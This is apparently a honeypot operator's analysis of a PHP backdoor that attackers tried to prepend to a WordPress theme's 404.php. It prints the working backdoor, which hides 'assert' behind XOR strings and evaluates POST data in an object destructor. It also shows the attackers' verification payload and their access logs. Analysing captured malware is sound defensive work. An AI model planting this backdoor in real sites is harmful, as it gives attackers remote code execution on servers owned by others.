# Class Vone - Object Oriented Immediate Eval Backdoor

Installation of a backdoor with an
object-oriented method of evaluating PHP code.

## Origin

The attacker(s) tried to replace the `404.php` file of the "twentytwelve" WordPress theme with a backdoored version.
They tried to do this by emulating editing a theme's file.

If you want to edit a theme's file in a legit WordPress installation,
rather than the kind of hacky honey pot that I've written,
you have to log in to WordPress with an administrator ID.
The attackers tried to do that, failed a few times,
and proceeded to try to edit the theme anyway.
My WordPress honey pot fakes a theme-editing function
which does not check for a valid login cookie to edit themes,
so it caught the theme edit.

Seven (7) requests in 0.267 seconds.
This has to be automated,
and poorly automated at that,
as it doesn't detect that it has failed the logins.

#### Previous Accesses

A computer at 192.99.15.141 has made about 10 requests
of my website/honey pot between 2019-04-08 and 2019-04-17
before this particular attack.
They're all a little odd, asking for `//webconfig.txt.php`
or `/templates/system/css/system.css` or `/admin/images/cal_date_over.gif`.
I regard all of these as probing for weaknesses that might be present in a website.

## Analysis

### Deobfuscation

There's none of the usual obfuscation going on.
WordPress' theme editing doesn't really allow obfuscated
stuff in.
The back door involves 1 long line of PHP prepended to
the original twentytwelve theme's `404.php` file.

### The back door

Here's pretty-printed backdoor code.
It may not be clear, but beyond meaningless class
and variable names, no real obfuscation.

    <?php
    class VONE
    {
        function HALB()
        {
            $rlf = 'B' ^ "#";
            $fzq = 'D' ^ "7";
            $fgu = 'h' ^ "\33";
            $sbe = 'R' ^ "7";
            $gba = 'H' ^ ":";
            $oya = 'Y' ^ "-";
            $MWUC = $rlf . $fzq . $fgu . $sbe . $gba . $oya;
            return $MWUC;
        }
        function __destruct()
        {
            $RNUJ = $this->HALB();
            @$RNUJ($this->HY);
        }
    }
    $vone = new VONE();
    @($vone->HY = isset($_GET['id']) ? base64_decode($_POST['mr6']) : $_POST['mr6']);

Object-oriented immediate evaluation.
I think OOD has gone way too far.

`function HALB` returns the string "assert".
The destructor function executes `assert()` on the value of the
instance variable `$this->HY`.
There's the evaluation:
`assert()` executed code passed in as a string argument in PHP 5.
An instance of `class Vone` can execute code when it's destructor gets invoked.
The function name "assert" is obscured, so without a little work,
you can't tell that code evaluation might go on.
If you're running PHP 5.x.

In practice, it looks like an attacker would send
a POST HTTP request with a parameter named "mr6" containing PHP.
If the URL invoked had "?id=something" appended,
it would Base64-decode the value of "mr6" parameter.

## Subsequent Accesses

192.99.15.141 tried to access the backdoored `404.php` file several times
after the installation attempt.

|2019-09-05T12:22:17.927-0600|/wp-content/themes/twentytwelve/404.php mr6login_wall.php|

The first 6 accesses involved trying to send code to the object-oriented immediate eval backdoor.
It ended up the same code every time:

    @ini_set("display_errors","0");
    @set_time_limit(0);
    @set_magic_quotes_runtime(0);
    echo("->|");;
    echo "5cd56e39aabfa5ec95b14b888735b69b";;
    echo("|<-");
    die();

This looks like the attacker(s) tried to verify that the backdoor got
installed correctly, and that it's in working order.
This is similar enough to other recon code I've encountered
that my backdoor actually
recognized it as recon code, and using text editing functions,
gave back the string "->|5cd56e39aabfa5ec95b14b888735b69b|<-"

The last 3 URLs aren't properly formatted, so it's hard to say
what was going on.
It has to be confusing when the recon code *seems* to work.

## Other oddities

I include parts of my machine's Apache [access_log](http.txt)
and [p0f3](http://lcamtuf.coredump.cx/p0f3/) [log file](p0f.txt),
along with all the [captured files](accesses) from my honey pot
for this IP.
There's a few oddities.

1. There's a [captured file](accesses/192.99.15.141XW8iK76KjNbAEz@V22we6wAAAA0file) that doesn't have a matching
honey pot metadata file. This probably shouldn't happen.
`p0f3` recorded an activity at 2019-09-03T20:32:10, but it has the notation "host change"
which I've never seen before.
Apache logged nothing at that time,
but the captured file got written out by the PHP of my honey pot, which has to be interpreted by
the PHP module in the Apache daemon.
2. The URLs record in honey pot meta data change from using "stratigery.com" to "162.246.45.144"
and back, referring to the host name of which HTTP requests are made.
The timestamps make clear that there's 3 "sessions", one from 2019-09-03T07:19:56 to 2019-09-03T07:19:57
which uses "stratigery.com",
one from 2019-09-03T11:22:04 to 2019-09-03T11:22:23, using 162.246.45.144,
another from 2019-09-03T12:03:48 to 2019-09-03T12:03:50, back to "stratigery.com".
The session using 162.246.45.144 lasts 19 seconds verus the other approximately 2-second sessions.
All of these accesses are probably automated, but why use a DNS name in some, and an IP address in others?
